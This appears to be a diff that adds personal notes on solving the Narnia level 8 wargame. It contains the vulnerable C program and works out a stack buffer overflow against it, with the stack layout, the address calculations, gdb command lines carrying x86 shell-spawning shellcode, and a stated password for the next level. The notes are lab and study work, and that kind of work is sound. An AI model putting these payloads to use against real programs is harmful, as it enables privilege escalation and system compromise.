@@ -1,0 +1,73 @@
+int i;
+
+void func(char *b){
+        char *blah=b;
+        char bok[20];
+        //int i=0;
+
+        memset(bok, '\0', sizeof(bok));
+        for(i=0; blah[i] != '\0'; i++)
+                bok[i]=blah[i];
+
+        printf("%s\n",bok);
+}
+
+int main(int argc, char **argv){
+
+        if(argc > 1)
+                func(argv[1]);
+        else
+        printf("%s argument\n", argv[0]);
+
+Overflow bok and change the return pointer from func?
+Use ltrace to figure out the address to bok outside of gdb?
+But if we overflow bok, then we overwrite blah (the copy of the b point) which screws things up!
+We must fill bok and then fill blah with b and then we can overflow with the return code for the shellcode
+
+A fills bok, the address re-creates blah, BBBB is for ebp, CCCC is the return code
+CCCC should be b + 20 + 4 + 4 + 4 = 0xffff d580
+gdb --args narnia8 "$(printf 'AAAAAAAAAAAAAAAAAAAA\x99\xd5\xff\xffBBBBCCCC')"
+gdb --args narnia8 "$(printf 'AAAAAAAAAAAAAAAAAAAA\x99\xd5\xff\xffBBBBCCCCj1X\xcd\x80\x89\xc3jFX\x89\xd9\xcd\x80jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80')"
+gdb --args ./narnia8 "$(printf 'AAAAAAAAAAAAAAAAAAAA\x60\xd5\xff\xffBBBB\x80\xd5\xff\xffj1X\xcd\x80\x89\xc3jFX\x89\xd9\xcd\x80jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80')"
+
+memset in shell: 0xffff d324 (0x20+gdb)
+memset in gdb:  0xffff d304
+gdb --args ./narnia8 "$(printf 'AAAAAAAAAAAAAAAAAAAA\x80\xd5\xff\xffBBBB\xa0\xd5\xff\xffj1X\xcd\x80\x89\xc3jFX\x89\xd9\xcd\x80jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80')"
+
+The b / blah address can be found out by overflowing with 20 characters. The address is what is output after the 20 AAAA
+narnia AAAA....20 st | xxd
+ffffd5c4
+For each character that is added to the string, the address decreases with one byte. The complete exploit is 70 characters longer than 20 AAAA, so subtract 70 from the revealed b/blah value above.
+length string 0x5a-20=70
+
+0xffff d5 7e blah / B value
+Return code is 0x20 after blah / B
+0xffff d5 9e return
+
+Password narnia9 is 1FFD4HnU4K
+
+
+
+Allocating 24 bytes for variables on stack
+
+blah is at -4 ebp or 0xffff d348 (directly above bok)
+bok is at -24 ebp 
+b is 0xffff d560
+ebp is at 
+i is at 
+AAAAAAAAAAAAAAAAAAAA
+
+
+Stack top
+
+ret 
+saved ebp
+blah
+bok[20]
+
+Tools
+gef
+pwndbg
+gdbinit
+pwntools
+radare2
